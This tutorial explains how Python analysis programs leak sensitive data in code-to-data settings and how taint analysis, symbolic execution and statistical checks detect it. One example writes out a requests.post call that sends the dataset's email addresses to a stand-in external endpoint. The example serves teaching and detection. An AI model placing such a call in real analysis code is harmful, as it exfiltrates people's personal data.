# Who Let the Data Out?

## Understanding Data Leakage in Python Programs

---

# 1. Introduction

Data protection is often approached by controlling access to data. Sensitive datasets are stored in protected environments, and only authorized users are allowed to access them.

However, another approach is becoming increasingly important: instead of bringing the data to the analysis, we bring the analysis to the data.

In such a **code-to-data** setting, a researcher or analyst provides a program that is executed close to the protected dataset. The original data remains inside the protected environment, while only the result of the computation is returned.

A simplified architecture looks like this:

```text
Analyst
   |
   | Python program
   v
Protected Environment
   |
   | program executes
   v
Sensitive Dataset
   |
   | approved result
   v
Analyst
```

This approach can reduce the need to distribute copies of sensitive datasets.

However, it introduces another problem:

> If a program is allowed to access sensitive data, how can we determine whether the program itself might disclose that data?

Consider:

```python
def analyze(df):
    return df["email"].tolist()
```

The dataset has never left the protected environment as a file, but its contents have effectively been disclosed through the program's result.

Leakage can also be less obvious:

```python
def analyze(df):
    x = df["email"]
    y = x.tolist()
    return y
```

Or it may happen through another output channel:

```python
def analyze(df):
    print(df["email"])
    return len(df)
```

More complicated programs may reveal information indirectly through aggregations, conditions, functions, combinations of attributes, or repeated analyses.

Therefore, protecting the dataset is not sufficient. The programs that operate on the dataset must also be analyzed.

This tutorial introduces different categories of data leakage that can occur in Python analysis programs, the fundamental concepts needed to understand them, and the techniques that can be used to detect and evaluate potential privacy violations.

---

# 2. Background

## 2.1 Example Dataset

Throughout this tutorial, assume that we have a small dataset containing student information.

| student_id | name  | email             | age | city      | grade |
|------------|-------|-------------------|-----|-----------|-------|
| 101        | Alice | alice@example.com | 21  | Rotterdam | 8.5   |
| 102        | Bob   | bob@example.com   | 22  | Leiden    | 7.0   |
| 103        | Carol | carol@example.com | 21  | Delft     | 9.0   |
| 104        | David | david@example.com | 23  | Rotterdam | 6.5   |
| 105        | Emma  | emma@example.com  | 22  | Leiden    | 8.0   |

Assume that Python loads the dataset into a pandas DataFrame called `df`.

For example:

```python
import pandas as pd

df = pd.read_csv("students.csv")
```

We will use this dataset to illustrate different kinds of information disclosure.

---

## 2.2 Sensitive Data

Sensitive data is information that should not be disclosed without appropriate authorization.

In our example, the student's grade is treated as sensitive information:

```text
grade
```

Other datasets may contain attributes such as medical information, salary, financial information, or personal circumstances.

Whether an attribute is sensitive depends on the dataset, applicable regulations, privacy policies, and intended use.

An important distinction is that information does not have to be legally classified as a special category of personal data to require protection.

---

## 2.3 Direct Identifiers

A **direct identifier** is an attribute that can directly identify an individual, either by itself or through a straightforward lookup.

Examples include:

- name;
- email address;
- student number;
- telephone number;
- national identification number.

In our example:

```text
student_id
name
email
```

are treated as direct identifiers.

Returning such an attribute may reveal who a record belongs to.

---

## 2.4 Quasi-Identifiers

Not every identifying attribute directly contains a person's identity.

A **quasi-identifier** is an attribute that may not uniquely identify someone by itself but may contribute to identification when combined with other information.

Examples include:

- age;
- postcode;
- city;
- occupation;
- gender;
- date of birth.

Suppose a dataset contains:

```text
age = 21
city = Delft
```

Neither value necessarily identifies someone independently.

However, the combination may correspond to only one person in a particular dataset or may become identifying when combined with external information.

Therefore, removing names and email addresses does not automatically make individual-level data safe to disclose.

---

## 2.5 Aggregation

Instead of returning individual records, an analysis often returns a summary of multiple records. This is called **aggregation**.

For example:

```python
df["grade"].mean()
```

produces:

```text
7.8
```

The output represents multiple students rather than one particular student.

Other common aggregates include:

```python
df["grade"].sum()
df["grade"].min()
df["grade"].max()
df["grade"].count()
```

Aggregation is often useful for reducing disclosure risk.

However:

> Aggregated information is not automatically privacy-safe.

For example, suppose we calculate:

```python
df.groupby("city")["grade"].mean()
```

If only one person belongs to a particular city, that city's average is exactly that person's grade.

Therefore, the size and composition of the group can be important.

Even large groups may present risks when combined with other information.

---

## 2.6 Minimum Group Size

One simple privacy rule is to require every reported group to contain at least a certain number of individuals.

For this tutorial, assume:

```text
minimum group size = 3
```

An aggregate calculated from three or more distinct individuals may be released under this simplified rule, while an aggregate based on one or two individuals is not permitted.

For example:

```text
Group A: 5 students -> meets minimum size
Group B: 2 students -> does not meet minimum size
Group C: 1 student  -> does not meet minimum size
```

This is only a simplified educational rule.

A minimum group size by itself does not guarantee anonymity or prevent information disclosure.

For example, repeated queries or combinations of results may still reveal individual information.

---

## 2.7 Data Leakage

For this tutorial, **data leakage** means that information protected by a privacy policy becomes observable outside its permitted boundary.

A very obvious example is:

```python
return df["email"].tolist()
```

However, leakage does not necessarily require returning the original value directly.

Sensitive information may be:

- copied;
- transformed;
- passed through functions;
- used in conditions;
- written to files;
- printed to logs;
- transmitted over a network;
- encoded in another output;
- revealed by an aggregate;
- inferred by combining multiple outputs.

Understanding these different cases requires analyzing how the program behaves.

Importantly, not every observable result derived from sensitive data is necessarily a privacy violation.

For example, an approved statistical summary may legitimately reveal certain facts about a protected dataset.

The distinction depends on the privacy policy and the information that is permitted to be released.

---

## 2.8 Static Code Analysis

**Static code analysis** examines a program without executing it.

For example, consider:

```python
def analyze(df):
    emails = df["email"]
    return emails
```

A static analyzer can inspect the source code and recognize that the program accesses the `email` column and returns its contents.

Static analysis can inspect properties such as:

- variable assignments;
- function calls;
- control flow;
- imported libraries;
- file operations;
- network operations;
- relationships between values.

One advantage is that potentially dangerous code can be inspected **before it executes**.

A limitation is that some properties depend on runtime data and cannot always be determined from the source code alone.

Static analysis is a broad category of techniques rather than a single algorithm.

Several concepts introduced below are commonly used in static analysis.

---

## 2.9 Data-Flow Analysis

**Data-flow analysis** studies how values move through a program.

Consider:

```python
x = df["email"]
y = x
z = y.tolist()

return z
```

The relevant flow is:

```text
df["email"]
     |
     v
     x
     |
     v
     y
     |
     v
     z
     |
     v
   return
```

The returned variable is called `z`, but its contents originate from `df["email"]`.

Looking only at the variable being returned would therefore be insufficient.

Data-flow analysis provides a foundation for tracking dependencies between values.

---

## 2.10 Sources and Sinks

Information-flow security commonly distinguishes between **sources** and **sinks**.

A **source** is where protected information enters the computation.

For example:

```python
df["email"]
df["student_id"]
df["grade"]
```

A **sink** is a place where information may become observable outside the permitted boundary.

Examples may include:

```python
return value
print(value)
file.write(value)
requests.post(..., data=value)
```

Whether an operation constitutes an unauthorized sink depends on the execution environment and privacy policy.

For example, writing to an internal protected log is not necessarily equivalent to returning information to an external analyst.

A useful question is therefore:

> Can information originating from a sensitive source reach an unauthorized sink?

---

## 2.11 Taint Analysis

**Taint analysis** is a form of information-flow analysis.

A value originating from a sensitive source can conceptually be marked, or *tainted*.

For example:

```python
emails = df["email"]
```

`emails` contains sensitive information.

If we then execute:

```python
x = emails
y = x.tolist()
```

the sensitivity propagates:

```text
email -> emails -> x -> y
```

If `y` reaches an unauthorized sink:

```python
return y
```

the analyzer reports a possible information flow from sensitive data to an observable output.

Taint analysis can be implemented statically, dynamically, or through combinations of both.

A limitation of simple taint analysis is that it may treat every value derived from sensitive information as equally sensitive, even when some transformations are permitted by policy.

---

## 2.12 Control-Flow Analysis

Programs do not always execute statements sequentially.

Consider:

```python
if debug:
    return df["email"].tolist()

return len(df)
```

Whether sensitive information is returned depends on the value of `debug`.

**Control-flow analysis** studies the possible execution paths through a program.

It is important because a privacy violation may exist only on one particular path.

Control-flow analysis can also help identify code that cannot execute.

---

## 2.13 Interprocedural Analysis

Information may also move between functions.

Consider:

```python
def get_emails(df):
    return df["email"].tolist()

def analyze(df):
    x = get_emails(df)
    return x
```

Understanding the privacy properties of `analyze()` requires understanding what `get_emails()` does.

Analysis that reasons across function boundaries is called **interprocedural analysis**.

This becomes particularly important when programs use helper functions, imported modules, or external libraries.

---

## 2.14 Explicit and Implicit Information Flow

An **explicit information flow** directly transfers or computes an output from a sensitive value.

For example:

```python
x = df["grade"].max()
return x
```

The returned result is directly computed from sensitive information.

An **implicit information flow** occurs when sensitive information influences the output indirectly through program control.

For example:

```python
if df["grade"].max() > 9:
    return 1
else:
    return 0
```

The actual grade is never returned.

Nevertheless, the output tells us something about the grades.

Therefore, information can flow without a direct assignment between the sensitive value and the output.

---

## 2.15 Privacy Policies and Analysis Results

Before evaluating a program, we need to define what is permitted and what is prohibited.

For example, consider the following simplified policy:

```text
P1: Direct identifiers must not be returned.

P2: Individual grades must not be disclosed.

P3: Statistical aggregates are permitted only when
    based on at least three distinct individuals.

P4: Protected information must not be transmitted
    to unauthorized external systems.

P5: Protected information must not appear in
    externally accessible logs or files.
```

These rules provide criteria against which program behavior can be evaluated.

An analysis may produce several possible outcomes:

**Compliant**

The available evidence establishes that the program satisfies the relevant policy under the stated assumptions.

**Violation**

The analysis identifies behavior that violates the policy.

**Potential violation**

The analysis identifies a possible disclosure, but additional information is needed to determine whether it is a real violation.

**Unknown**

The available analysis cannot establish compliance or a violation.

This distinction is useful because the inability to prove that a program is unsafe does not automatically establish that it is safe.

---

# 3. Categories of Data Leakage

The following sections move from simple leakage patterns to more complicated forms of information disclosure.

Each category presents a scenario, a Python example, and an explanation.

The focus is on understanding the privacy property, independently of the particular technology used to analyze it.

---

## 3.1 Category A — Direct Disclosure

### Scenario

The simplest leakage occurs when a program directly returns a protected attribute.

### Example

```python
def analyze(df):
    return df["email"].tolist()
```

### Result

```text
[
    "alice@example.com",
    "bob@example.com",
    "carol@example.com",
    "david@example.com",
    "emma@example.com"
]
```

### Explanation

The `email` attribute is a direct identifier.

The program reads the protected column and sends its values directly to the output.

The information flow is:

```text
email -> return
```

Under the tutorial's privacy policy, this is a direct violation.

---

## 3.2 Category B — Sensitive Data Access Without Disclosure

### Scenario

A program may access sensitive information without necessarily disclosing it.

### Example

```python
def analyze(df):
    emails = df["email"]

    return {
        "number_of_students": len(emails)
    }
```

### Result

```text
{"number_of_students": 5}
```

### Explanation

The program accesses the email column, but the email addresses themselves do not reach the output.

The output contains only the number of records.

Therefore, under a policy that prohibits disclosure of email addresses rather than access to the column, this program may be acceptable.

However, the number of records is itself information about the dataset. Whether it can be released depends on the applicable policy.

This distinction is important:

> Accessing sensitive information and disclosing sensitive information are different properties.

---

## 3.3 Category C — Leakage Through Variable Propagation

### Scenario

Sensitive information may pass through several variables before it reaches an output.

### Example

```python
def analyze(df):
    x = df["email"]
    y = x
    z = y.tolist()

    return z
```

### Result

The program returns the email addresses.

### Explanation

The relevant information flow is:

```text
df["email"]
     |
     v
     x
     |
     v
     y
     |
     v
     z
     |
     v
   return
```

Searching only for something such as:

```python
return df["email"]
```

would miss this example.

The important property is the dependency between the sensitive source and the output, not the names of intermediate variables.

---

## 3.4 Category D — Leakage After Transformation

### Scenario

A program may transform sensitive information before releasing it.

Transformation does not automatically make information safe.

### Example

```python
def analyze(df):
    emails = df["email"]
    domains = emails.str.split("@").str[-1]

    return domains.tolist()
```

### Result

The program returns:

```text
[
    "example.com",
    "example.com",
    "example.com",
    "example.com",
    "example.com"
]
```

### Explanation

The original email addresses are not returned.

However, information derived from each individual's email address is still released at the individual-record level.

In this particular dataset, the transformation reveals only a common domain. It does not reveal the original email addresses.

Nevertheless, other datasets may contain distinctive email domains that reveal organizational affiliations or contribute to identification.

Whether this transformation is acceptable depends on the privacy policy and the actual information revealed.

The important lesson is:

> A transformation is not automatically equivalent to anonymization.

---

## 3.5 Category E — Leakage Across Functions

### Scenario

Sensitive information may be accessed in one function and disclosed in another.

### Example

```python
def extract_emails(df):
    return df["email"].tolist()


def analyze(df):
    result = extract_emails(df)
    return result
```

### Result

The program returns the email addresses.

### Explanation

The sensitive source does not appear directly inside `analyze()`.

The information flow crosses a function boundary:

```text
df["email"]
      |
      v
extract_emails()
      |
      v
   result
      |
      v
    return
```

The behavior of the complete program depends on the interaction between its functions.

---

## 3.6 Category F — Conditional Leakage

### Scenario

A program may disclose information only under certain conditions.

### Example

```python
def analyze(df, debug=False):

    if debug:
        return df["email"].tolist()

    return {"count": len(df)}
```

### Result

For:

```python
debug = False
```

the program returns only the number of records.

For:

```python
debug = True
```

the program returns the email addresses.

### Explanation

The program contains at least one execution path that discloses sensitive information.

Whether that path is relevant depends on whether `debug=True` is possible in the intended execution environment.

A privacy analysis therefore needs to consider possible execution paths and their associated conditions.

---

## 3.7 Category G — Unreachable Leakage Code

### Scenario

Sensitive-looking code may exist in a program but never execute.

### Example

```python
def analyze(df):

    if False:
        return df["email"].tolist()

    return {"count": len(df)}
```

### Result

The program always returns:

```text
{"count": 5}
```

### Explanation

The statement containing the email addresses is unreachable.

A simple keyword-based checker might still report:

```text
email + return = leak
```

However, the sensitive statement cannot execute in this example.

This distinction is important when studying false alarms.

A program should not necessarily be classified as unsafe simply because it contains suspicious syntax.

---

## 3.8 Category H — Safe Aggregation

### Scenario

Instead of returning individual records, a program returns a statistical summary.

### Example

```python
def analyze(df):
    return {
        "average_grade": df["grade"].mean()
    }
```

### Result

The program returns:

```text
{"average_grade": 7.8}
```

### Explanation

The output represents five individuals rather than exposing their individual grades.

Under our simplified minimum-group-size policy, this aggregate satisfies the requirement of at least three individuals.

Therefore, this example can be considered acceptable under that specific rule, assuming no other relevant restriction is violated.

However, aggregation alone does not guarantee privacy.

For example, previous outputs or external knowledge might make the aggregate more informative than it initially appears.

---

## 3.9 Category I — Small-Group Leakage

### Scenario

An aggregate can reveal individual information when it represents too few people.

### Example

```python
def analyze(df):
    result = df.groupby("city")["grade"].mean()

    return result.to_dict()
```

### Result

The result is:

```text
{
    "Delft": 9.0,
    "Leiden": 7.5,
    "Rotterdam": 7.5
}
```

### Explanation

Only Carol lives in Delft in our example dataset.

Therefore:

```text
average grade of students in Delft = Carol's grade
```

The value `9.0` reveals the grade of the only individual in that group.

All three groups also violate our minimum-group-size requirement:

```text
Delft:     1 student
Leiden:    2 students
Rotterdam: 2 students
```

The program itself does not explicitly return Carol's record.

The privacy problem emerges from the relationship between the aggregation and the dataset.

This illustrates why some privacy properties cannot be determined from source code alone.

---

## 3.10 Category J — Quasi-Identifier Leakage

### Scenario

A program may remove direct identifiers but still return combinations of attributes that make individuals distinguishable.

### Example

```python
def analyze(df):
    return df[
        ["age", "city"]
    ].to_dict("records")
```

### Result

The output is:

```text
[
    {"age": 21, "city": "Rotterdam"},
    {"age": 22, "city": "Leiden"},
    {"age": 21, "city": "Delft"},
    {"age": 23, "city": "Rotterdam"},
    {"age": 22, "city": "Leiden"}
]
```

### Explanation

Names and email addresses are absent.

Nevertheless, combinations such as:

```text
21 + Delft
```

may identify a person when combined with other information.

In our dataset, this combination corresponds to only one individual.

However, uniqueness within a dataset does not automatically prove that an external observer can identify the person.

Actual re-identification risk also depends on available external information and the characteristics of the population.

The important lesson is:

> Removing direct identifiers is not necessarily sufficient to prevent re-identification.

---

## 3.11 Category K — Implicit Information Flow

### Scenario

Sensitive information influences the output through a decision rather than being returned directly.

### Example

```python
def analyze(df):

    if df["grade"].max() > 8:
        return {"result": 1}

    return {"result": 0}
```

### Result

For our dataset, the program returns:

```text
{"result": 1}
```

### Explanation

The observer learns:

```text
At least one student has a grade greater than 8.
```

No individual grade has been returned.

Nevertheless, information about the sensitive column has influenced an observable result.

The flow is approximately:

```text
grade
  |
  v
condition
  |
  v
branch selected
  |
  v
output
```

This is an example of implicit information flow.

Whether this particular disclosure is acceptable depends on the privacy policy.

---

## 3.12 Category L — Leakage Through Logs

### Scenario

The official result may be safe while sensitive information is disclosed through logging or debugging output.

### Example

```python
def analyze(df):

    print(df["email"].tolist())

    return {
        "count": len(df)
    }
```

### Result

The returned result is:

```text
{"count": 5}
```

but the program also prints all email addresses.

### Explanation

`return` is not the only possible information sink.

If logs or standard output are visible outside the protected environment, then:

```python
print(...)
```

can become a disclosure channel.

If the output remains inside a protected environment and is inaccessible to unauthorized users, the same operation may have a different security interpretation.

A privacy analysis should therefore identify the relevant output channels and their visibility.

---

## 3.13 Category M — Leakage Through Files

### Scenario

A program stores protected information in a file.

### Example

```python
def analyze(df):

    df["email"].to_csv(
        "emails.csv",
        index=False
    )

    return {"status": "completed"}
```

### Result

The returned value contains no personal information.

However, the program creates a file containing email addresses.

### Explanation

File operations can create another path by which information leaves its intended boundary.

Whether this represents an actual disclosure depends on the file's location, permissions, retention, and accessibility.

A secure execution policy may therefore prohibit file writes entirely or restrict them to controlled locations and formats.

---

## 3.14 Category N — Leakage Through Network Communication

### Scenario

A program attempts to transmit information to an external system.

### Example

```python
import requests


def analyze(df):

    requests.post(
        "https://example.org/collect",
        json={
            "emails": df["email"].tolist()
        }
    )

    return {"status": "completed"}
```

### Result

The returned value looks harmless.

However, the program attempts to transmit email addresses through another communication channel.

### Explanation

The sensitive information flow is:

```text
email
  |
  v
HTTP request
  |
  v
external system
```

Whether the transmission actually succeeds depends on network availability, execution controls, and the remote endpoint.

Even if outgoing network access is blocked, the program contains a potentially prohibited operation.

Network communication is therefore an important sink in security-oriented program analysis.

---

## 3.15 Category O — Leakage Through Error Messages

### Scenario

Sensitive information can accidentally become part of an error or exception message.

### Example

```python
def analyze(df):

    try:
        raise ValueError(
            f"Invalid email: {df['email'].iloc[0]}"
        )

    except ValueError as error:
        return {
            "error": str(error)
        }
```

### Result

The result contains:

```text
{"error": "Invalid email: alice@example.com"}
```

### Explanation

The programmer may not have intended to return an email address.

Nevertheless, sensitive information becomes part of the exception message and reaches the output.

Error handling must therefore also be considered during privacy analysis.

Uncaught exceptions and diagnostic tracebacks may create similar risks when their contents are exposed to unauthorized users.

---

## 3.16 Category P — Leakage Through Multiple Queries

### Scenario

Individual outputs may appear acceptable but reveal sensitive information when combined.

Consider two analyses.

### Analysis 1

```python
def analyze(df):
    return {
        "total_grade": df["grade"].sum()
    }
```

It returns:

```text
{"total_grade": 39.0}
```

### Analysis 2

```python
def analyze(df):

    subset = df[
        df["student_id"] != 101
    ]

    return {
        "total_grade": subset["grade"].sum()
    }
```

It returns:

```text
{"total_grade": 30.5}
```

### Result

An observer can calculate:

```text
39.0 - 30.5 = 8.5
```

and therefore determine the grade associated with student 101.

### Explanation

Each result represents at least three students.

Therefore, both analyses satisfy our simplified minimum-group-size rule when evaluated independently.

However, their combination reveals an individual grade.

The leakage appears through the **composition of multiple results**.

This type of disclosure is significantly harder to detect because analyzing one program independently may not provide enough information.

It may be necessary to examine the history of queries, the relationship between released results, and the information already known to the analyst.

---

## 3.17 Category Q — Leakage Through Returned Models or Objects

### Scenario

Programs may return complex objects rather than simple statistics.

Calling an object a "model" does not automatically make it privacy-safe.

### Example

```python
def analyze(df):

    model = {
        "known_emails":
            df["email"].tolist()
    }

    return model
```

### Result

The returned object contains all email addresses.

### Explanation

Privacy analysis must examine the information contained in an output rather than relying on its variable name or intended purpose.

More sophisticated machine-learning models can also memorize information from training data.

For example, trained models may unintentionally reveal information about particular training records.

Evaluating such leakage may require techniques beyond ordinary source-code analysis.

---

# 4. Techniques for Analyzing and Checking Data Leakage

The previous sections introduced different data leakage properties.

The next question is:

> How can we determine whether a Python program satisfies these privacy requirements?

There is no single analysis technique that can reliably detect every category.

Some techniques inspect source code without executing it. Others observe runtime behavior, reason mathematically about program properties, inspect actual outputs, or evaluate information disclosure statistically.

The following sections introduce the main approaches and briefly discuss their advantages and limitations.

---

## 4.1 Rule-Based Source Code Inspection

### Idea

Rule-based inspection searches for code patterns associated with prohibited behavior.

For example, a rule might flag:

```python
df["email"]
```

when it appears in a return statement.

Other rules might identify:

```python
print(...)
```

```python
requests.post(...)
```

```python
to_csv(...)
```

The rules can be implemented using textual pattern matching or, more reliably, by examining the program's Abstract Syntax Tree (AST).

An AST represents the syntactic structure of a program, making it possible to distinguish different Python constructs.

### Advantages

- Relatively simple to implement.
- Fast and suitable for automated checks.
- Easy to explain and audit.
- Effective for detecting known prohibited operations.

### Limitations

- May miss indirect information flows.
- May produce false alarms.
- Often struggles with functions, aliases, and complex program behavior.
- Cannot generally establish whether an aggregate satisfies a dataset-dependent privacy rule.

### Particularly useful for

Categories A, L, M, and N.

---

## 4.2 Static Data-Flow and Taint Analysis

### Idea

Static data-flow analysis tracks dependencies between values without executing the program.

Taint analysis extends this idea by labeling sensitive sources and propagating these labels through computations.

For example:

```python
def analyze(df):
    x = df["email"]
    y = x.tolist()
    return y
```

The analyzer tracks:

```text
email -> x -> y -> return
```

If the resulting value reaches an unauthorized sink, the program can be flagged.

More advanced analysis may track flows across functions, objects, and imported modules.

### Advantages

- Detects indirect leakage through intermediate variables.
- Can inspect programs before execution.
- Can analyze multiple execution paths.
- Suitable for identifying source-to-sink dependencies.

### Limitations

- May report flows that cannot occur in practice.
- Dynamic Python features complicate precise tracking.
- External libraries may require additional models.
- Ordinary taint tracking does not determine whether a statistical release is privacy-safe.
- Simple taint analysis may miss implicit flows through control decisions.

### Particularly useful for

Categories A, C, D, E, F, L, M, N, O, and Q.

---

## 4.3 Control-Flow and Reachability Analysis

### Idea

Control-flow analysis examines the possible paths a program can take.

For example:

```python
def analyze(df):

    if False:
        return df["email"].tolist()

    return len(df)
```

A control-flow analyzer can determine that the sensitive return statement is unreachable.

In more complicated cases, the analyzer examines conditions, loops, exceptions, and branches.

### Advantages

- Helps distinguish reachable from unreachable leakage.
- Reduces some false alarms.
- Identifies conditional disclosure paths.
- Improves the precision of other static analyses.

### Limitations

- Complex conditions may be difficult to evaluate.
- Some branches depend on runtime data.
- Dynamic Python behavior complicates path analysis.
- A large number of possible paths can make analysis expensive.

### Particularly useful for

Categories F and G.

---

## 4.4 Symbolic Execution

### Idea

Symbolic execution analyzes a program using symbolic values instead of concrete inputs.

Consider:

```python
def analyze(df, debug):

    if debug:
        return df["email"].tolist()

    return len(df)
```

Instead of choosing a particular value for `debug`, symbolic execution explores the conditions under which different paths execute.

It may derive:

```text
debug = True  -> sensitive information returned
debug = False -> record count returned
```

Symbolic execution can also reason about conditions involving dataset properties, provided these properties are represented in a suitable mathematical model.

### Advantages

- Can reason about input-dependent behavior.
- Can identify conditions required for a violation.
- May produce concrete counterexamples.
- Useful for analyzing complex branches.

### Limitations

- Computationally expensive for complex programs.
- May suffer from path explosion.
- Difficult to apply precisely to dynamic Python features and large libraries.
- Requires suitable models of relevant operations.

### Particularly useful for

Categories F, G, and K.

It can also support the evaluation of some aggregation-related conditions.

---

## 4.5 Dynamic Analysis and Runtime Monitoring

### Idea

Dynamic analysis observes a program while it executes.

Instead of reasoning only about source code, the system monitors actual operations.

For example, it may record:

```text
Sensitive column accessed
    |
    v
Value transformed
    |
    v
Output generated
```

Runtime monitoring may inspect:

- returned values;
- printed output;
- file operations;
- network requests;
- function calls;
- exceptions.

Dynamic taint tracking can additionally track how sensitive values propagate during execution.

### Advantages

- Observes actual program behavior.
- Can work with concrete dataset values.
- Can detect disclosures caused by runtime conditions.
- Useful for monitoring operations involving files, logs, and networks.

### Limitations

- Only observes paths that are executed.
- May miss violations triggered by other inputs.
- Introduces runtime overhead.
- Monitoring can be difficult for native libraries and complex data structures.
- Potentially harmful operations require an appropriately isolated execution environment.

### Particularly useful for

Categories A, C, D, F, L, M, N, and O.

---

## 4.6 Testing and Property-Based Testing

### Idea

Testing evaluates whether a program behaves correctly for selected inputs.

For privacy analysis, tests can construct datasets with known sensitive properties.

For example, we may test an aggregation using:

```text
Dataset A: groups of size 5
Dataset B: groups of size 2
Dataset C: groups of size 1
```

The objective is to verify whether the program respects the minimum-group-size policy.

Property-based testing extends ordinary testing by automatically generating many inputs that satisfy specified constraints.

For example:

```text
Generate datasets with different group sizes.

Execute the analysis.

Check whether any reported aggregate
corresponds to fewer than 3 individuals.
```

### Advantages

- Relatively easy to automate.
- Can identify concrete policy violations.
- Useful for dataset-dependent properties.
- Can exercise edge cases that developers may overlook.

### Limitations

- Cannot generally prove the absence of violations.
- Effectiveness depends on test coverage.
- Requires well-defined privacy properties.
- Generated datasets may not represent all realistic disclosure scenarios.

### Particularly useful for

Categories F, G, H, I, J, and K.

---

## 4.7 Output Inspection and Statistical Disclosure Control

### Idea

Some privacy violations can only be identified by examining the actual outputs together with the dataset's statistical properties.

For example:

```python
df.groupby("city")["grade"].mean()
```

The source code alone does not reveal how many individuals belong to each city.

A statistical disclosure check can examine the group sizes:

```text
Rotterdam: 2
Leiden:    2
Delft:     1
```

The output violates the minimum-group-size requirement.

Other checks may examine:

- small groups;
- unique attribute combinations;
- dominance of an aggregate by a small number of individuals;
- unusually revealing statistical results;
- differences between related outputs.

### Advantages

- Directly evaluates dataset-dependent privacy properties.
- Useful for aggregates and statistical releases.
- Can detect risks missed by source-code inspection.
- Supports explicit and measurable disclosure rules.

### Limitations

- Requires access to dataset properties or actual outputs.
- May be computationally expensive.
- Some privacy risks depend on external knowledge.
- Fixed statistical rules do not provide complete privacy guarantees.

### Particularly useful for

Categories H, I, J, and P.

---

## 4.8 Formal Verification and Information-Flow Security

### Idea

Formal verification uses mathematical methods to determine whether a program satisfies specified properties.

For privacy analysis, one important concept is **noninterference**.

Informally, noninterference means that changes to protected information should not affect outputs observable by unauthorized users.

Consider:

```python
def analyze(df):
    return df["grade"].max()
```

Changing a protected grade may change the returned value.

Therefore, the output depends on protected information.

A strict noninterference policy would reject such behavior.

However, many data-analysis applications intentionally release approved information derived from protected data.

Consequently, practical privacy policies may require controlled information release rather than complete noninterference.

Formal methods can model such permitted disclosures under explicitly defined conditions.

### Advantages

- Provides precise mathematical definitions.
- Can establish strong guarantees under stated assumptions.
- Useful for distinguishing permitted and prohibited information flows.
- Supports rigorous reasoning about security properties.

### Limitations

- Requires formal specifications and suitable program models.
- Can be computationally expensive.
- Difficult to apply to arbitrary Python programs.
- Dataset-dependent and contextual privacy requirements can be challenging to formalize.

### Particularly useful for

Categories C, E, F, G, and K.

With appropriate models, formal methods may also support reasoning about other disclosure categories.

---

## 4.9 Query History and Composition Analysis

### Idea

Some disclosure risks emerge only after combining multiple results.

Consider:

```text
Query 1 -> total grade of all students = 39.0

Query 2 -> total grade excluding student 101 = 30.5
```

Combining these results reveals:

```text
grade of student 101 = 8.5
```

A query-history analyzer evaluates a new result in the context of information released previously.

The analysis may involve:

- recording previous queries;
- tracking previously released statistics;
- identifying overlapping subsets;
- checking whether combinations reveal protected values;
- enforcing cumulative disclosure constraints.

### Advantages

- Detects risks that individual program analysis misses.
- Useful for repeated statistical queries.
- Can identify disclosure through combinations of otherwise acceptable outputs.
- Supports privacy policies that consider cumulative information release.

### Limitations

- Requires maintaining query history.
- May require tracking results across users or sessions.
- Can be computationally expensive.
- External knowledge and previously obtained information may be unknown.
- Determining the total information revealed can be difficult.

### Particularly useful for

Category P.

It may also help evaluate Categories H, I, and J.

---

## 4.10 Machine-Learning Privacy Evaluation

### Idea

When an analysis returns a trained model, privacy risks may not be visible by inspecting the model's structure alone.

Machine-learning models may memorize information from their training data.

Privacy evaluation techniques can investigate whether sensitive information can be inferred from the model.

Examples include:

- membership inference evaluation;
- model inversion evaluation;
- training-data extraction tests.

A membership inference evaluation investigates whether access to a model can reveal whether a particular record was part of its training dataset.

A model inversion evaluation investigates whether information about training data can be reconstructed from model behavior.

These techniques are commonly used to assess the privacy risks of trained models.

### Advantages

- Addresses risks specific to machine-learning outputs.
- Can reveal disclosures not obvious from source code.
- Useful for evaluating models before release.
- Supports empirical privacy-risk assessment.

### Limitations

- Results depend on the chosen evaluation methods and assumptions.
- Failure to demonstrate leakage does not prove that a model is safe.
- Evaluation may be computationally expensive.
- Actual risks depend on the model, data, and adversary capabilities.

### Particularly useful for

Category Q.

---

## 4.11 LLM-Based Code Analysis

### Idea

Large Language Models can be used to interpret Python programs and assess their behavior against privacy requirements.

An LLM may be provided with:

- program source code;
- dataset schema;
- descriptions of sensitive attributes;
- privacy policies;
- information about the execution environment.

The model can then examine whether the program appears to violate the specified requirements.

For example:

```python
def analyze(df):
    values = df["email"]
    return values.tolist()
```

An LLM may recognize that the returned values are derived from a direct identifier.

It may also reason about more complicated cases involving helper functions, conditions, or transformations.

### Advantages

- Can interpret complex source-code structures.
- Can work with privacy policies expressed in natural language.
- Relatively flexible when introducing new leakage patterns.
- Can generate human-readable explanations.
- Can assist in identifying risks that are difficult to express as simple rules.

### Limitations

- May miss real violations.
- May incorrectly report safe programs as unsafe.
- Conclusions may vary across prompts, models, or equivalent code.
- Does not inherently provide formal correctness guarantees.
- May struggle with long programs, dynamic behavior, and precise data-flow tracking.
- Cannot reliably establish dataset-dependent properties without appropriate information.
- Supplying code or data to an external LLM service may introduce additional confidentiality requirements.

### Particularly useful for

Categories A–G and K–O, especially as a flexible code-review aid.

For Categories H–J, P, and Q, LLM analysis generally requires additional dataset information, analytical methods, or external evidence.

---

## 4.12 Hybrid Analysis

### Idea

Hybrid analysis combines two or more techniques to compensate for their individual limitations.

For example:

```text
Python Program
      |
      v
Rule-Based Inspection
      |
      v
Static Data-Flow Analysis
      |
      v
Runtime Evaluation
      |
      v
Statistical Privacy Checks
      |
      v
Policy Decision
```

Another combination may use an LLM to identify potentially relevant behavior, while dedicated analysis tools verify specific claims.

For example:

```text
LLM
 |
 | identifies a possible leakage path
 v
Static Analyzer
 |
 | checks source-to-sink dependencies
 v
Runtime or Statistical Analysis
 |
 | checks dataset-dependent conditions
 v
Privacy Assessment
```

The objective is not necessarily to use every technique.

Instead, an appropriate combination can be selected based on the privacy properties being checked.

### Advantages

- Combines complementary strengths.
- Can improve coverage across different leakage categories.
- Supports both source-code and data-dependent analysis.
- Allows uncertain findings to be examined through additional techniques.

### Limitations

- More complex to design and maintain.
- May introduce additional computational costs.
- Requires integrating results from different analyzers.
- Conflicting conclusions need a defined resolution process.
- Combining imperfect techniques does not automatically guarantee correctness.

### Particularly useful for

Programs involving several leakage categories or privacy policies requiring both code-level and dataset-level checks.

---

# 5. Choosing an Analysis Technique

Different leakage categories require different forms of reasoning.

A useful distinction is between three questions:

**Question 1: What can the program do?**

This concerns program structure, execution paths, operations, and information flows.

**Question 2: What information will the program reveal for a particular dataset?**

This requires considering dataset values, group sizes, and actual outputs.

**Question 3: What can an observer infer from the released information?**

This may require considering previous outputs, auxiliary knowledge, statistical relationships, and the behavior of trained models.

These questions are related but not equivalent.

